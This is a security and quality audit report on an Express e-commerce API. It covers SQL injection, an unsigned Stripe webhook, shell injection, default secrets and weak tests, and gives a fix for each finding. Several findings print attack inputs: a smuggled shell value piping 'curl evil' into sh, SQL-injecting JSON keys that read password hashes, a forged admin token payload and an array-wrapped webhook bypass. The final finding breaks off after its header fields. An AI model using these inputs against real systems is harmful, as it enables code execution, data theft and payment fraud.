# UCOF Report

## Summary Dashboard
- **Project**: shoply-api
- **Health Score**: 0/100
- **Critical**: 3
- **High**: 6
- **Medium**: 14
- **Low**: 7

## Domain Scores
- **security**: 11/100
- **external**: 77/100
- **data**: 87/100
- **backend**: 82/100
- **infrastructure**: 96/100
- **performance**: 94/100
- **quality**: 84/100
- **frontend**: analysis unavailable

## Highest-Leverage Fixes
1. **SEC-233e01** GET /api/users/:id interpolates req.params.id into SQL (S)
2. **SEC-287d42** PATCH /api/users/:id builds the SET clause from request body keys (S)
3. **EXT-bfb186** Stripe webhook at POST /webhooks/stripe marks orders paid without verifying the Stripe signature (S)

## Trend
- **Score Change**: +0
- **New Findings**: None
- **Resolved Findings**: None

## Systemic Patterns
- **Untrusted Boundaries**: Request input reaches SQL, the shell, and payment state without validation or authentication. Route params and body keys are interpolated into SQL, a body field is passed to a shell, the Stripe webhook is accepted unsigned, and client-supplied prices become order totals. Authorization is applied at the router level only, so routes under /api/users never check ownership or role.
- **Insecure Defaults**: Secrets have committed fallbacks. The Stripe key and JWT secret both default to literals in src/config.js, .env.example ships the same JWT value, and the CI workflow hands the Stripe secret to a placeholder deploy step. A deployment with a missing env var runs silently with known secrets instead of failing.
- **No Safety Net**: Nothing catches regressions or runtime faults. The only test compares a literal to itself, no linter runs, CI cannot pass because npm ci has no lockfile, and Express 4 async handlers have no error wrapper, so a single bad request crashes the process.
- **Happy Path Only**: Failure and shutdown paths are not designed. Order creation runs as separate autocommit statements, the email worker swallows provider errors and has no timeout, webhook redelivery is not deduplicated, the process has no SIGTERM handling, and the error handler leaks stacks while ignoring err.status.
- **No Safety Net**: Quality and infrastructure findings together suggest weak guardrails before production.
- **Untrusted Boundaries**: Security and backend findings indicate weak validation or access controls at system boundaries.

## Model Fallbacks
No model fallbacks were required.

## Analysis Unavailable
- **frontend**: No browser-rendered UI code; JSON API only.

## Findings By Severity

### Critical
### SEC-233e01: GET /api/users/:id interpolates req.params.id into SQL
- **Domain**: security
- **Severity**: critical
- **Confidence**: high
- **Verification**: confirmed — api/users.js:8 puts req.params.id straight into the SQL text with a template literal and passes no params array. src/db.js:7-8 forwards text and params to pool.query unchanged. With no params, pg uses the simple query protocol, so UNION and stacked statements both work. The only guard is requireAuth at src/server.js:13, and the route has no per-route validation. Critical is correct.
- **Rationale**: req.params.id is placed into the query string with a template literal and passed to db.query with no params array. db.query (src/db.js:7-9) forwards the text to pool.query unchanged. Any authenticated user reaches this route; requireAuth is the only guard (src/server.js:13).
- **File**: api/users.js
- **Lines**: 8
- **Impact**: Any logged-in customer can run arbitrary SQL. For example, a UNION can return password_hash for every user, and stacked statements can modify data.
- **Recommendation**: Parameterize the query and validate that the id is an integer.
- **Effort**: S

### SEC-287d42: PATCH /api/users/:id builds the SET clause from request body keys
- **Domain**: security
- **Severity**: critical
- **Confidence**: high
- **Verification**: confirmed — api/users.js:22-24 builds the SET clause from Object.keys(req.body) with no allowlist. express.json (src/server.js:10) accepts any JSON key. Because a params array is passed, pg uses the extended protocol, which rules out stacked statements. A key like `email = (select password_hash from users where id=1), role` still injects a subquery, and RETURNING id,email,role sends the result back. The ownership check at line 21 only fixes the target row to the caller's own id, which any authenticated user can pass. This lets a user read or alter other rows' data through subqueries. Critical stands.
- **Rationale**: Object.keys(req.body) are placed into the SQL text verbatim as column names. Values are parameterized, but identifiers are not checked against an allowlist. The only guard is that the caller is patching their own id, and any authenticated user meets that.
- **File**: api/users.js
- **Lines**: 22-24
- **Impact**: Any logged-in user can inject SQL through a JSON key, for example {"role = 'admin', email": "x"}, or a subquery in the key. That allows reading or rewriting other rows.
- **Recommendation**: Allow only a fixed set of updatable columns (for example email) and reject any other key before building the query.
- **Effort**: S

### EXT-bfb186: Stripe webhook at POST /webhooks/stripe marks orders paid without verifying the Stripe signature
- **Domain**: external
- **Severity**: critical
- **Confidence**: high
- **Verification**: confirmed — api/webhooks.js:11-16 calls JSON.parse(req.body.toString()) and then runs the 'paid' update and the enqueue. It never reads the stripe-signature header or calls constructEvent, and the Stripe client built at :8 is never used. src/config.js:5-8 and .env.example:1-3 define no webhook secret. src/server.js:10 registers app.use(express.json()) before the /webhooks mount at :16, and the mount has no auth middleware (unlike :13-15). express.json therefore parses the body first, and the route's express.raw then skips it as already parsed. body-parser's strict mode accepts arrays, so a body like ["{...event...}"] arrives as an array whose toString() is the inner string, which then parses into an attacker-chosen event. Even without the array trick, nothing authenticates the endpoint. A real Stripe object body becomes "[object Object]" and throws inside an async Express 4 handler, so the reporter's side note about lost legitimate payments also holds. I did not run the exploit; the static path is enough for critical.
- **Rationale**: The handler calls JSON.parse on the request body and then runs `update orders set status = 'paid'` using event.data.object.metadata.orderId. It never reads the stripe-signature header or calls stripe.webhooks.constructEvent. The Stripe client built on line 8 is never used, and config/.env.example define no webhook signing secret. The global express.json() at server.js:10 runs before the route's express.raw, so req.body is already parsed. A JSON array whose only element is the event serialized as a string gets through: Array.prototype.toString returns that string, so JSON.parse works and any caller can mark any order paid. I worked this out from body-parser behavior and did not run it.
- **File**: api/webhooks.js
- **Lines**: 11-16
- **Impact**: An unauthenticated attacker can mark any pending order as paid and trigger a receipt email without paying, so goods ship for free. Real Stripe deliveries are object bodies. For those, req.body.toString() returns "[object Object]" and JSON.parse throws inside an async Express 4 handler, which leaves an unhandled rejection (on Node 20, used in CI, this exits the process by default). Real payments are probably never recorded, but a run is needed to confirm that.
- **Recommendation**: Mount the webhook router ahead of app.use(express.json()) so express.raw gets the untouched bytes. Add STRIPE_WEBHOOK_SECRET to config. Build the event with stripe.webhooks.constructEvent(req.body, req.headers['stripe-signature'], secret) and return 400 on failure, before any parsing or database write. Wrap the handler in try/catch or pass errors to next(err).
- **Effort**: S


### High
### SEC-b7cee0: GET /api/users/:id returns any user's record without an ownership check
- **Domain**: security
- **Severity**: high
- **Confidence**: high
- **Verification**: confirmed — api/users.js:7-10 returns id, email and role for any client-supplied id. There is no comparison with req.user.sub and no role check, while PATCH at line 21 does check ownership. The router-level guard is only requireAuth (src/server.js:13). Any authenticated user can enumerate other users' email and role.
- **Rationale**: The handler loads a user by a client-supplied id and never compares it to req.user.sub or checks for the admin role. The PATCH route next to it does enforce ownership.
- **File**: api/users.js
- **Lines**: 7-10
- **Impact**: Any customer can list every user's email and role by walking sequential ids.
- **Recommendation**: Return 403 unless String(req.user.sub) === req.params.id or req.user.role === 'admin'.
- **Effort**: S

### SEC-147c0e: GET /api/users returns every user's email and role to any logged-in user
- **Domain**: security
- **Severity**: high
- **Confidence**: high
- **Verification**: confirmed — api/users.js:14-16 returns id, email, role and created_at for every user, with no role check. The router is mounted with only requireAuth at src/server.js:13, while requireAdmin is applied only to /api/admin (src/server.js:15). Any customer can pull the full user list in one request.
- **Rationale**: The /api/users router is guarded only by requireAuth (src/server.js:13). The list handler has no role check, while the equivalent admin data sits behind requireAdmin.
- **File**: api/users.js
- **Lines**: 14-16
- **Impact**: Any customer can download the full customer list (emails and roles) in one request.
- **Recommendation**: Put requireAdmin on this route or move it under /api/admin.
- **Effort**: S

### API-68df3f: Async Express 4 handlers have no wrapper, so DB errors and validation throws become unhandled rejections
- **Domain**: backend
- **Severity**: high
- **Confidence**: high
- **Verification**: confirmed — package.json:6 pins express ^4.19.2, which ignores the promise an async handler returns. None of the handlers are wrapped. A repo-wide grep found no asyncHandler, no .catch( and no process.on('unhandledRejection'). Throws and rejections at api/orders.js:18 (validateItems), api/orders.js:20/22, api/users.js:8, api/webhooks.js:12 (JSON.parse) and api/admin.js:13 (execSync) all become unhandled rejections. CI uses Node 20 (.github/workflows/ci.yml:9), and since Node 15 an unhandled rejection terminates the process by default. The webhook route is mounted with no auth (src/server.js:16), so one unauthenticated POST /webhooks/stripe with an invalid JSON body can crash the API. Any authenticated user can do the same with bad items on POST /api/orders. High is warranted.
- **Rationale**: package.json pins express ^4.19.2, which does not forward rejected promises from async handlers to the error middleware. Every handler (validateItems throws, db.query failures, JSON.parse in the webhook, execSync in admin) rejects the promise instead. The request hangs, and on Node 15+ the unhandled rejection terminates the process.
- **File**: api/orders.js
- **Lines**: 16-18
- **Impact**: One authenticated request with an invalid body, or one DB blip, can crash the whole API process or leave clients hanging. The Stripe webhook can also fail without a response.
- **Recommendation**: Wrap async handlers in a helper that forwards errors to next(), or upgrade to Express 5. Also add a process-level unhandledRejection log.
- **Effort**: S

### SEC-c5ac00: JWT secret falls back to 'change-me'
- **Domain**: security
- **Severity**: high
- **Confidence**: medium
- **Verification**: confirmed — src/config.js:6 defaults jwtSecret to 'change-me', and .env.example:3 ships the same value. src/auth.js:9 verifies HS256 tokens with that secret, and src/auth.js:17 grants admin based only on the token's role claim. If JWT_SECRET is unset or copied from the example, anyone can forge an admin token and reach the shell-injectable export at api/admin.js:13. That precondition is why the reporter rated confidence medium. High severity is appropriate given the admin and RCE reach.
- **Rationale**: requireAuth verifies tokens with config.jwtSecret, which defaults to the public string 'change-me' when JWT_SECRET is unset. .env.example uses the same value, so a deployment copied from the example is also exposed. requireAdmin trusts the role claim in the token.
- **File**: src/config.js
- **Lines**: 6
- **Impact**: If the env var is missing or left at the example value, anyone can forge {"sub":1,"role":"admin"} and get full admin access, including the shell-injectable export route.
- **Recommendation**: Fail at startup when JWT_SECRET is unset or shorter than 32 bytes, and remove the default.
- **Effort**: S

### SEC-465613: POST /api/admin/export passes req.body.table into a shell command
- **Domain**: security
- **Severity**: high
- **Confidence**: high
- **Verification**: confirmed — api/admin.js:13 puts req.body.table into an execSync command string, which runs through a shell. The handler never checks the table against the TABLES allowlist at src/db.js:13; only countRows (src/db.js:15) uses it. A value containing a double quote and `;` escapes the quoting and runs arbitrary commands. Only admins can reach it (requireAuth and requireAdmin at src/server.js:15), and admin is reachable with a forged token if the default secret is in use (src/config.js:6). Admin-gated RCE rated high is appropriate.
- **Rationale**: req.body.table is put into an execSync command string run by /bin/sh. It does not go through the TABLES allowlist in src/db.js:13. A value such as `orders to stdout"; curl evil|sh; #` breaks out of the quotes. The route requires the admin role, but that role can be gained through the PATCH mass assignment or a forged JWT signed with the default secret.
- **File**: api/admin.js
- **Lines**: 13
- **Impact**: Remote code execution on the API host with access to DATABASE_URL and every environment secret.
- **Recommendation**: Check the table name against the TABLES allowlist and stop using a shell. Use pg COPY through pg-copy-streams, or execFile('psql', [...]) with no shell.
- **Effort**: M

### QA-142f95: Stripe webhook handler, which marks orders paid and enqueues receipts, has no tests
- **Domain**: quality
- **Severity**: high
- **Confidence**: high
- **Verification**: confirmed — In api/webhooks.js, line 12 runs JSON.parse on the raw body with no try/catch. Line 14 dereferences event.data.object.metadata.orderId without a guard. Line 15 updates the order status to paid and line 16 enqueues the receipt email. The only test file, tests/health.test.js, requires only node:test and node:assert (lines 1-2), and a grep of tests/ finds no reference to webhooks. The route is mounted at src/server.js:16. This handler changes payment state and has no test coverage, so high severity for a missing-tests finding is justified.
- **Rationale**: The handler parses the raw body, reads event.data.object.metadata.orderId, updates order status and enqueues an email. tests/ contains no file that imports api/webhooks.js. Malformed events, a missing metadata.orderId, non-succeeded event types and queue failures are all unexercised.
- **File**: api/webhooks.js
- **Lines**: 11-19
- **Impact**: Payment state transitions are changed with no regression safety net. A bad edit could leave paid orders unmarked or crash on unexpected events, and nothing in CI would catch it.
- **Recommendation**: Add node:test cases that call the route with a stubbed db.query and emailQueue. Cover payment_intent.succeeded, other event types, invalid JSON and missing metadata. The same pass should cover requireAuth/requireAdmin in src/auth.js and the orders and users routes, which are also untested.
- **Effort**: M


### Medium
### SEC-0bb311: PATCH /api/users/:id lets a user set their own role to admin
- **Domain**: security
- **Severity**: medium
- **Confidence**: high
- **Verification**: downgraded — The mass assignment is real: api/users.js:22-24 writes any body key, including role (prisma/schema.sql:5), to the caller's own row. But requireAdmin (src/auth.js:17) checks the role claim inside the JWT, not the database. The repo has no jwt.sign or login/token issuer (grep over api/, src/, workers/ found none). So whether a role written to the database ever becomes an admin token depends on code outside this repo. The escalation to /api/admin/export is unconfirmed. The confirmed impact is an unauthorized write to one's own role column.
- **Rationale**: Every key in req.body becomes a column update, including role and password_hash (prisma/schema.sql:4-5). A user patching their own record can send {"role":"admin"}. requireAdmin trusts the role claim in the JWT, so once a token is issued from this row the user passes the admin guard.
- **File**: api/users.js
- **Lines**: 21-24
- **Impact**: Any customer can become an admin and reach /api/admin/export, which has a shell injection.
- **Recommendation**: Allow only the user-editable columns (for example email). Change role only through an admin-only path.
- **Effort**: S

### DATA-bf86e8: POST /api/orders inserts the order and its items as separate autocommit statements
- **Domain**: data
- **Severity**: medium
- **Confidence**: high
- **Verification**: downgraded — The defect is real. api/orders.js:20 inserts the order and api/orders.js:21-23 inserts each item with a separate db.query call. src/db.js:8 runs each call as pool.query, which autocommits, and there is no BEGIN/COMMIT anywhere in the repo. A failed item insert leaves a committed 'pending' order with a total but missing items. A client can trigger this on purpose: validateItems at api/orders.js:30 checks only Number.isInteger, so a productId above 2^31-1 overflows the integer column at prisma/schema.sql:20 and fails after the order row is already committed. The blast radius is smaller than high, though. Orders are scoped to req.user.sub, so a caller can only corrupt their own orders. Nothing is exposed across users, and the caller gains nothing. Transient DB failure mid-loop is the only other trigger. The webhook (api/webhooks.js:15) marks an order paid only after the user pays that order's payment intent. This is a medium-severity integrity bug, not high.
- **Rationale**: The handler inserts into orders, then loops inserting each order_item through db.query, which runs pool.query and takes a different pooled connection with autocommit each time. There is no BEGIN/COMMIT. If any item insert fails (a DB error, or a crash mid-loop), the order row stays committed.
- **File**: api/orders.js
- **Lines**: 20-23
- **Impact**: Orders can be left with a total but missing or partial line items. Those orders can later be marked paid by the Stripe webhook for goods that are not recorded.
- **Recommendation**: Add a transaction helper in src/db.js that checks out a client with pool.connect(). Run the order insert and all item inserts on that client between BEGIN and COMMIT, with ROLLBACK on error. Insert the items in one statement using unnest or a multi-row VALUES.
- **Effort**: S

### DATA-06a18c: orders.user_id is filtered and used as a foreign key but has no index
- **Domain**: data
- **Severity**: medium
- **Confidence**: high
- **Verification**: confirmed — api/orders.js:8 filters orders on user_id and sorts by id desc. prisma/schema.sql:9-15 creates orders with only the serial primary key, and the only explicit index in the file is order_items_order_id_idx at prisma/schema.sql:23. Postgres does not index foreign-key columns automatically, so orders.user_id (schema.sql:11) is unindexed. The route is reachable by any authenticated user (src/server.js:13-14). Medium severity fits.
- **Rationale**: The orders list query filters on user_id and sorts by id desc. schema.sql creates no index on orders(user_id); the only index on that table is the primary key. Postgres does not index foreign key columns automatically.
- **File**: api/orders.js
- **Lines**: 8
- **Impact**: Every order list request scans the orders table, which grows with every order placed. Deletes on users also scan orders when checking the foreign key.
- **Recommendation**: Add create index orders_user_id_id_idx on orders(user_id, id desc). Use CONCURRENTLY if the table already exists in production.
- **Effort**: S

### DATA-72811e: GET /api/users returns every user row with no LIMIT
- **Domain**: data
- **Severity**: medium
- **Confidence**: high
- **Verification**: confirmed — api/users.js:15 runs 'select id, email, role, created_at from users order by created_at desc' with no LIMIT or pagination and returns every row at api/users.js:16. The only guard is requireAuth (src/server.js:13), with no requireAdmin, so any authenticated user can trigger it. prisma/schema.sql:6 has no index on created_at. Medium is appropriate for unbounded response growth.
- **Rationale**: The query selects all users ordered by created_at with no LIMIT or pagination. The users table grows with signups, and created_at is not indexed.
- **File**: api/users.js
- **Lines**: 15
- **Impact**: Response size, memory use and sort cost grow without bound as users are added. Any authenticated user can trigger the full scan.
- **Recommendation**: Add keyset pagination with a limit capped at about 100, and index created_at, id if the ordering is kept.
- **Effort**: S

### API-a651bf: Global error handler returns error.message and stack trace to clients
- **Domain**: backend
- **Severity**: medium
- **Confidence**: high
- **Verification**: downgraded — The leak is real. src/server.js:18-20 returns error.message and error.stack on every response it handles, and nothing checks NODE_ENV. The claimed blast radius is wrong, though. package.json:6 pins express ^4.19.2, and Express 4 does not route rejected promises from async handlers to error middleware. The pg errors from db.query (api/users.js:8, api/orders.js:20, src/db.js:8) are thrown inside async handlers, so they never reach this handler and no SQL text leaks this way. What does reach it is synchronous next(err) from middleware. The main case is the body-parser parse error from the global express.json() at src/server.js:10. That middleware runs before requireAuth (server.js:13-15), so anyone can send malformed JSON and get back a stack trace with server and node_modules file paths. The leak is unauthenticated, but it exposes paths and a parser message, not DB internals, so medium rather than high.
- **Rationale**: The terminal error middleware serializes error.stack and error.message into every 500 response with no NODE_ENV gate. Any error that reaches it, including pg errors that carry SQL text, exposes file paths and internals.
- **File**: src/server.js
- **Lines**: 18-20
- **Impact**: Callers learn server file paths, dependency layout and DB error text, which helps them attack the service.
- **Recommendation**: Log the error server-side. Return a generic body such as {error:'internal'} and honor err.status for 4xx. Include the stack only when NODE_ENV is not production.
- **Effort**: S

### API-08c24c: Server has no SIGTERM handler and never closes the HTTP server, pg pool or BullMQ queue
- **Domain**: backend
- **Severity**: medium
- **Confidence**: high
- **Verification**: confirmed — src/server.js:23 calls app.listen(config.port) without keeping the handle. The grep for SIGTERM and process.on found nothing in the repo. src/db.js:4 never calls pool.end(), workers/email.js:4 never closes the Queue, and workers/email.js:18 never closes the Worker. The partial-order impact is real: api/orders.js:20-23 inserts the order and then each item in separate queries with no transaction, so a kill during the loop leaves an order with only some of its items. The stalled-job part is softer, because BullMQ's stall detection retries interrupted jobs. Medium fits.
- **Rationale**: app.listen is called with no handle kept, no signal handlers, and no pool.end() or emailQueue.close(). The Worker in workers/email.js is also never closed.
- **File**: src/server.js
- **Lines**: 22-24
- **Impact**: Each deploy kills in-flight requests, such as an order insert midway through its items loop, and in-progress email jobs. This leaves partial orders and stalled jobs.
- **Recommendation**: Keep the server handle. On SIGTERM, call server.close(), then worker.close(), emailQueue.close() and pool.end(), then exit.
- **Effort**: S

### INFRA-499905: No lockfile is tracked, so the CI `npm ci` step fails and production dependencies are unpinned
- **Domain**: infrastructure
- **Severity**: medium
- **Confidence**: high
- **Verification**: confirmed — git ls-files lists no package-lock.json or npm-shrinkwrap.json. The tracked files are .env.example, .github/workflows/ci.yml, README.md, api/*, package.json, prisma/schema.sql, src/*, tests/health.test.js and workers/email.js. Yet .github/workflows/ci.yml:10 runs `npm ci`, which refuses to install without a lockfile, so the job fails before `npm test` at ci.yml:11 and the test gate never runs. package.json:6 uses caret ranges for every production dependency. No .github/dependabot.yml and no audit step are tracked (the grep for lock, dependabot and gitignore matched nothing). Medium severity is appropriate for a CI gate that cannot pass plus unpinned dependencies.
- **Rationale**: `git ls-files` shows no package-lock.json. `npm ci` requires a lockfile and errors without one. package.json uses caret ranges for all production dependencies, and there is no Dependabot or `npm audit` step.
- **File**: .github/workflows/ci.yml
- **Lines**: 10
- **Impact**: CI cannot pass, so the test gate never runs. If the lockfile were bypassed with `npm install`, builds would not be reproducible and could pick up a compromised or breaking release. Vulnerable dependencies would go unnoticed.
- **Recommendation**: Commit package-lock.json and add a .gitignore that excludes node_modules and .env. Add .github/dependabot.yml and an `npm audit --omit=dev` step.
- **Effort**: S

### PERF-ea4706: GET /api/orders runs one order_items query per order inside a for-await loop
- **Domain**: performance
- **Severity**: medium
- **Confidence**: high
- **Verification**: downgraded — The N+1 is real. api/orders.js:8 loads up to 50 orders, and api/orders.js:9-11 awaits one order_items query per order in sequence, so one request makes up to 51 serial round trips. It is reachable by any authenticated user (src/server.js:14). Two parts of the claim are overstated. First, src/db.js:7-9 calls pool.query, which checks out a connection and releases it after each query. A request therefore holds at most one connection at a time and does not hold several across its round trips, so the pool-exhaustion claim does not hold up. Second, prisma/schema.sql:23 indexes order_items(order_id), so each lookup is cheap, and the fan-out is capped at 50 by the LIMIT at api/orders.js:8. The cost is bounded serial latency, so medium rather than high.
- **Rationale**: The handler loads up to 50 orders, then awaits a separate `order_items` query for each one in sequence. A single request therefore makes up to 51 serial round trips, and the default pg pool has only 10 connections.
- **File**: api/orders.js
- **Lines**: 9-11
- **Impact**: Latency on the orders list grows with page size, and each request holds pool connections for many round trips. Concurrent users can exhaust the pool.
- **Recommendation**: Fetch all items in one query with `order_id = ANY($1)`, then group them by order_id in memory. Alternatively, use a single join or json_agg query.
- **Effort**: S

### QA-aeb1e6: The only test, 'health shape', compares a literal to an identical literal and can never fail
- **Domain**: quality
- **Severity**: medium
- **Confidence**: high
- **Verification**: confirmed — tests/health.test.js:5 compares a literal to an identical literal with assert.deepEqual({ ok: true }, { ok: true }). The file's only requires are node:test and node:assert/strict (lines 1-2), so it never loads src/server.js. That is notable because src/server.js:26 exports the app and :12 defines GET /health. The test is the only file in tests/ (git ls-files), and CI runs it through npm test (.github/workflows/ci.yml:11, package.json:5). It passes no matter what the app does.
- **Rationale**: The assertion is deepEqual({ ok: true }, { ok: true }), and both values are built inside the test. The test never requires src/server.js or sends a request to /health, so it cannot detect any change in the app.
- **File**: tests/health.test.js
- **Lines**: 4-6
- **Impact**: CI runs `npm test` and shows green while the whole API is untested. The test suite gives false assurance and would pass even if the server failed to load.
- **Recommendation**: Import the app from src/server.js (it is already exported), start it on an ephemeral port or use a request helper, and assert the status and body of GET /health. Then add real tests for the auth, orders and webhook routes.
- **Effort**: S

### SEC-55f50c: Live-format Stripe secret key hardcoded as config fallback
- **Domain**: security
- **Severity**: medium
- **Confidence**: medium
- **Verification**: downgraded — src/config.js:5 does fall back to a hardcoded sk_live_ literal when STRIPE_SECRET_KEY is unset, and api/webhooks.js:8 builds the Stripe client from it. But the value follows an obvious synthetic pattern ('...NpQrStUvWxYz0123456789ABCDEFGHIJ'), and .env.example:2 uses sk_test_xxx. Nothing shows this is a live credential. The confirmed defect is a silent fallback to a committed placeholder key instead of failing at startup. The account-compromise impact rests on the key being real, which is unverified.
- **Rationale**: config.stripeKey falls back to a literal sk_live_ key whenever STRIPE_SECRET_KEY is unset. A secret key is committed to source, and production silently uses it if the env var is missing. The value looks synthetic ('0123456789ABCDEFGHIJ'), so whether it is a real key cannot be confirmed without testing it against Stripe.
- **File**: src/config.js
- **Lines**: 5
- **Impact**: If the key is real, anyone with repo access can issue refunds, read customer payment data, and create charges on the live Stripe account.
- **Recommendation**: Remove the literal and fail at startup when STRIPE_SECRET_KEY is missing. Rotate the key in Stripe and purge it from git history.
- **Effort**: S

### QA-688993: No linter, formatter or type checker is configured or run in CI
- **Domain**: quality
- **Severity**: medium
- **Confidence**: medium
- **Verification**: confirmed — package.json:5 defines only the start and test scripts, and package.json:6 lists no eslint, prettier or typescript dependency. .github/workflows/ci.yml:10-11 runs only npm ci and npm test. git ls-files and a directory listing of the root show no .eslintrc, .prettierrc, tsconfig or similar config. The reporter's caveat about not checking for config files is resolved: none exist. Medium severity fits, because the only other gate is a test that cannot fail (tests/health.test.js:5).
- **Rationale**: package.json defines only start and test scripts and has no eslint, prettier or typescript dependency. ci.yml runs only npm ci and npm test, so nothing static gates changes. I did not check for lint config files outside the scout's file list.
- **File**: package.json
- **Lines**: 5
- **Impact**: Undefined variables, unhandled async errors and unused code in an untyped JavaScript backend reach production unchecked. The test suite is effectively empty, so no other gate exists.
- **Recommendation**: Add ESLint with the recommended ruleset (including no-undef and no-floating-promises-style rules) as a `lint` script, and run it in the CI workflow before npm test.
- **Effort**: S

### PERF-714d61: Admin export blocks the event loop with execSync and buffers the whole table in memory
- **Domain**: performance
- **Severity**: medium
- **Confidence**: high
- **Verification**: confirmed — api/admin.js:13 calls the synchronous execSync to run psql \copy on a whole table inside the request handler. The event loop is blocked until psql exits, which stalls every other request, including /health at src/server.js:12. The whole stdout is buffered and turned into a string before res.send at api/admin.js:14. execSync has a default maxBuffer of 1 MiB, so larger tables make it throw. The route sits behind requireAuth and requireAdmin (src/server.js:15, src/auth.js:16-18), and the reporter already took that into account in rating it medium. I found nothing that streams the output or runs the export asynchronously. The medium severity is correct.
- **Rationale**: The handler calls `execSync` to run psql `\copy` on a whole table. The event loop is blocked until the dump finishes, and the full output is then buffered as a string before being sent. execSync's default maxBuffer will also throw on large tables.
- **File**: api/admin.js
- **Lines**: 13-14
- **Impact**: While one export runs, every other request on the process stalls, including /health. Large tables fail at the maxBuffer limit or consume large amounts of memory. The route is admin-only, which limits who can trigger it. The command-injection risk on `req.body.table` belongs to the security lens.
- **Recommendation**: Use async `spawn` and pipe the child's stdout to `res`, or stream with pg-copy-streams. Do not buffer the output.
- **Effort**: M

### SEC-e15003: POST /api/orders takes the order total from client-supplied priceCents
- **Domain**: security
- **Severity**: medium
- **Confidence**: medium
- **Verification**: downgraded — This is real: validateItems (api/orders.js:33) only checks that priceCents is a non-negative integer, and api/orders.js:19-20 computes and stores total_cents from client prices, including 0. However, there is no products table in prisma/schema.sql (only users, orders, order_items), and no code in the repo creates a Stripe charge from total_cents (grep found no paymentIntent or charge creation). So it is unconfirmed that the amount actually charged is affected. Also, the webhook (api/webhooks.js:12-15) marks orders paid without checking the amount, so the underpayment path is not shown here. The confirmed impact is wrong order totals in stored data.
- **Rationale**: validateItems only checks that priceCents is a non-negative integer. The total is then computed from those client values and stored as total_cents, with no lookup of real product prices. No code in the repo creates the Stripe charge, so it is unconfirmed whether the charge amount comes from this total.
- **File**: api/orders.js
- **Lines**: 19-20
- **Impact**: A customer can create orders at any price, including 0 cents. Combined with the unsigned webhook, the order can then be marked paid.
- **Recommendation**: Ignore client prices. Load the unit price for each productId from the products table on the server and compute the total from those prices.
- **Effort**: M

### DATA-a5b26a: order_items.product_id has no foreign key and no products table exists in the schema
- **Domain**: data
- **Severity**: medium
- **Confidence**: medium
- **Verification**: confirmed — prisma/schema.sql:20 declares product_id as a bare integer with no foreign key, and the schema defines no products table (prisma/schema.sql:1-23). Yet src/db.js:13 allowlists 'products'. api/orders.js:22 inserts the client-supplied item.productId, which is only checked to be an integer (api/orders.js:30). There are no CHECK constraints on quantity (schema.sql:21) or orders.status (schema.sql:13). Nonexistent product references can be persisted. Medium is reasonable.
- **Rationale**: product_id is a bare integer. The schema defines no products table, although db.js allowlists 'products'. POST /api/orders inserts whatever integer the client sends. orders.status is also unconstrained free text.
- **File**: prisma/schema.sql
- **Lines**: 17-22
- **Impact**: Orders can reference nonexistent products, which leaves orphaned or invalid line items. A typo in a status value goes undetected.
- **Recommendation**: Define a products table and add a foreign key from order_items.product_id. Add check constraints for quantity > 0 and for the allowed orders.status values.
- **Effort**: M


### Low
### EXT-0879f3: Stripe webhook redelivery enqueues a duplicate receipt email
- **Domain**: external
- **Severity**: low
- **Confidence**: high
- **Verification**: downgraded — It is true that api/webhooks.js:15-16 has no event.id dedupe, no jobId on emailQueue.add, and no status guard in the update. But the stated trigger, Stripe redelivery, cannot reach those lines today. Every real Stripe delivery is an object body after express.json (src/server.js:10), so JSON.parse('[object Object]') at api/webhooks.js:12 throws before :15. The only replay that works now is a forged request, and finding 0 already covers that. This becomes a real medium issue once the signature and raw-body fix lands, so it is latent rather than currently exploitable.
- **Rationale**: Each payment_intent.succeeded delivery calls emailQueue.add('receipt', { orderId }). There is no event.id dedupe and no BullMQ jobId, and Stripe redelivers events at-least-once on timeouts or non-2xx responses. The order update does not check the current status either. A replayed old event therefore sets an order to 'paid' whatever state it is in now.
- **File**: api/webhooks.js
- **Lines**: 15-16
- **Impact**: Customers get repeated receipt emails for one payment, and a replayed event can set a cancelled or refunded order back to paid.
- **Recommendation**: Use the Stripe event id as the BullMQ jobId so redeliveries dedupe. Only allow the pending-to-paid transition in the update, and skip the enqueue when no row changed.
- **Effort**: S

### EXT-875f49: sendReceipt logs mail-provider failures and returns, so BullMQ marks failed receipts as completed
- **Domain**: external
- **Severity**: low
- **Confidence**: high
- **Verification**: downgraded — The swallow is real. At workers/email.js:12-14 a non-ok response only reaches console.log, so the processor at :18 resolves and the job completes. The enqueue at api/webhooks.js:16 passes no attempts, and the Queue at workers/email.js:4 sets no defaultJobOptions, so BullMQ's default of one attempt applies. Severity is lower than claimed for two reasons. The Worker only starts under require.main at workers/email.js:17, and nothing in package.json:5 or .github/workflows/ci.yml starts it. Also, enqueues are currently unreachable for real Stripe events (api/webhooks.js:12 throws, see finding 1). What is lost is receipt emails, not payment state.
- **Rationale**: When the mail provider returns a non-2xx response (429, 5xx, 4xx), sendReceipt only calls console.log and resolves. The Worker processor therefore succeeds and the job is marked completed. The enqueue site sets no attempts or backoff, so BullMQ's default of one attempt applies and even a thrown network error is never retried. Separately, nothing in package.json, CI, or the README starts workers/email.js; it only runs under require.main === module. Whether any consumer runs in production is an infrastructure question.
- **File**: workers/email.js
- **Lines**: 12-14
- **Impact**: A rate-limited or briefly unavailable mail provider loses receipt emails silently. Nothing retries them, and they never appear in the failed set for inspection.
- **Recommendation**: Throw on non-ok responses, including the status and any Retry-After value, so BullMQ records a failure. Set defaultJobOptions on the Queue with attempts and exponential backoff, and keep failed jobs (removeOnFail: false) for inspection.
- **Effort**: S

### API-de4d46: Validation errors tagged status 400 are returned as 500 because the error handler ignores err.status
- **Domain**: backend
- **Severity**: low
- **Confidence**: high
- **Verification**: downgraded — src/server.js:19 does hardcode res.status(500) and ignores err.status. But the cited example cannot happen. validateItems (api/orders.js:28,31,33) throws inside the async handler at api/orders.js:16-18, and under Express 4 (package.json:6) that rejection never reaches the error middleware. The request hangs or the process crashes instead (see finding 2). The handler does get errors that carry a status: the body-parser errors from express.json() at server.js:10, which have status 400 (or 413 for too large). Those do come back as 500, so the defect exists, but only for malformed or oversized JSON bodies. That is a narrow monitoring and client-semantics problem.
- **Rationale**: validateItems throws errors with { status: 400 }, but the global handler hardcodes res.status(500). Client mistakes are therefore reported as server faults.
- **File**: src/server.js
- **Lines**: 19
- **Impact**: Clients and monitoring see 5xx for bad input, so error alerts are noisy and clients cannot tell their mistakes from outages.
- **Recommendation**: Use err.status in the error handler: res.status(err.status || 500).
- **Effort**: S

### INFRA-9f530e: CI step echoes STRIPE_SECRET_KEY into the workflow log
- **Domain**: infrastructure
- **Severity**: low
- **Confidence**: high
